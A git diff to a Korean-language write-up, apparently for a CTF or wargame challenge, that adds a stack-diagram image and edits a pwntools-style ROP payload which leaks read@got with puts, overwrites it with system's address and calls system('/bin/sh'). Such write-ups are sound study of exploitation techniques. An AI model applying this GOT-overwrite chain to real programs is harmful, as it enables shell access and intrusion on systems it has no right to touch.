@@ -168,6 +168,12 @@ payload += p64(read_plt)        # read(0, read@got, 0) 호출
 
 * rsi에 **read@got** 주소를 넣으므로, read 호출 시, **read@got**를 호출한다. 이 때, 해당 값을 **system@got(system의 주소)**를 넣게 된다면 `system`를 호출하게 된다.
 
+### Stack
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/193451995-1ee666fc-d8c3-4362-9059-fa6f6a891f14.jpg" width = 350>
+</p>
+
 ### Exploit
 
 해당 코드들을 payload 순서에 맞게 적절히 넣어서 실행하면 된다.
@@ -210,7 +216,7 @@ payload += p64(puts_plt)        # puts(read@got) 호출
 
 # read(0, read@got, 0) => read@got -> system
 payload += p64(pop_rdi) + p64(0)        # read(0, , )
-payload += p64(pop_rsi_r15) + p64(read_got) + p64(1000)    # read(0, read@got, 0)
+payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)    # read(0, read@got, 0)
 payload += p64(read_plt)        # read(0, read@got, 0) 호출
 # read("/bin/sh") => system("/bin/sh")
 payload += p64(pop_rdi)
